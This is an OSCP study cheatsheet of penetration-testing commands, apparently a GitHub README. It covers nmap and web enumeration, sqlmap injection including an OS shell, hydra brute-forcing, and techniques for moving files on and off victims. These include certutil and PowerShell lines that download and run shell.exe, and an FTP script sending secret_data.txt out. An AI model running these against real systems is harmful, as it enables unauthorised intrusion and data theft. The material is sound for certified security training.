# OSCP Cheatsheet

The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend and update it from time to time, so let's see where this is going. 

All of the commands are also available in a - more structured - cherry tree file.

## Disclaimer
This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, use most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges become very blurred with some tools. Feel free to issue a PR if you want to help to improve the list.
**Use for educational pruposes only!**

***

# Reconnaissance

## Autorecon
https://github.com/Tib3rius/AutoRecon

```bash
autorecon -vv 192.168.0.1
```

***

## Nmap

### Initial Fast TCP Scan

```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
```

### Full TCP Scan

```bash
nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
```

### Limited Full TCP Scan
If the syn scan is taking very long to complete, the following command is an alternative (no service detection).

```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
```

### Top 100 UDP Scan

```bash
nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
```

### Full Vulnerability scan

```bash
nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

### Vulners Vulnerability Script

```bash
nmap -v -sS  -Pn --script nmap-vulners -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

### SMB Vulnerabitlity Scan

```bash
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.0.1 192.168.0.1
```

***

## Gobuster

### HTTP
#### Fast Scan (Small List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```
#### Fast Scan (Big List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

#### Slow Scan (Check File Extensions)
```bash
gobuster dir -e -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
```

### HTTPS

Set the `--insecuressl` flag.

***

## SMBCLIENT

To fix `NT_STATUS_CONNECTION_DISCONNECTED` errors in new Kali installations add `client min protocol = NT1` to your `\etc\samba\smb.conf` file.

### List Shares (As Guest)

```bash
smbclient -U guest -L 192.168.0.1
```

### Connect to A Share (As User John)

```bash
smbclient \\\\192.168.0.1\\Users -U c.smith
```

### Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'

example:
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'
```

### Alternate File Streams

#### List Streams

```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'allinfo "\Users\John\file.txt"'
```

#### Download Stream By Name (:SECRET)
```bash
smbclient \\\\192.168.0.1\\Data -U John

get "\Users\John\file.txt:SECRET:$DATA"
```

***

## Enum4Linux

### Scan Host
```bash
enum4linux 192.168.0.1
```
### Scan Host, Suppress Errors
```bash
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out 
```

***

## NFS

### Show mountable drives
```bash
showmount -e 192.168.0.1
```

### Mount Drive
```bash
mkdir mpt
mount -t nfs -o soft 192.168.0.1:/backup mpt/
```

***

## WebApp Paths

https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md

***

## SQLMAP

### Get Request

### Test All (Default Settings)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
```

#### Test All (Default Settings, High Stress)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

### Post Request (Capture with BURP)

#### Test All (Default Settings)

```bash
sqlmap --all -r post_request.txt --batch 
```
#### Test All (Default Settings, High Stress)
```bash
sqlmap --all -r post_request.txt --batch --level=5 --risk=3
```

#### Get A Reverse Shell (MySQL)
```bash
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```

***

# Brute Force

## Hydra

### HTTP Basic Authentication

```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

### HTTP Get Request

```bash
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

### HTTP Post Request
Check request in BURP to see Post parameters. **-l or -L has to be set, even if there is no user to login with!**. Use `https-post-form` instead of `http-post-form` for HTTPS sites.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

### MYSQL
Change MYDATABASENAME. Default databasename is mysql.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

***

# File Transfer

## Powershell

### As Cmd.exe Command

```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

### Encode Command for Transfer
Very helpful for chars that need to be escaped otherwise.

```bash
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded
```

***

## Certutil

### Download
```bash
certutil.exe -urlcache -f http://10.10.14.32/shell.exe C:\Windows\Temp\shell.exe
```

### Download & Execute Python Command
```bash
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

***

## SMB

### Start Impacket SMB Server (With SMB2 Support)

```bash
impacket-smbserver -smb2support server_name /var/www/html
```

### List Drives (Execute on Victim)
```bash
net view \\192.168.0.1
```

### Copy Files (Execute on Victim)
```bash
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

***

## PureFTP

### Install
```bash
apt-get update && apt-get install pure-ftpd
```

### Create setupftp.sh Execute The Script
Change user.

```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

```bash
./setupftp.sh
```

### Get Service Ready

#### Reset Password
```bash
pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd
```
 #### Commit Changes
 ```bash
pure-pw mkdb
 ```

 #### Restart Service
 ```bash
/etc/init.d/pure-ftpd restart 
 ```

 ### Create FTP Script On Victim
 ```bash
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt
 ```

### Exectue Script

```bash
ftp -v -n -s:ftp.txt
```

***

## Netcat

## Receiving System
```bash
nc -l -p 1234 > out.file
```

## Sending System
```bash
nc -w 3 192.168.0.1 1234 < out.file
```

***

## TFTP

### Start TFTP Daemon (Folder /var/tftp)

```bash
atftpd --daemon --port 69 /var/tftp
```

### Transfer Files

```bash
tftp -i 192.168.0.1 GET whoami.exe
```

***

## VBScript 

### Create wget.vbs File 
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

### Download Files 

```bash
cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
```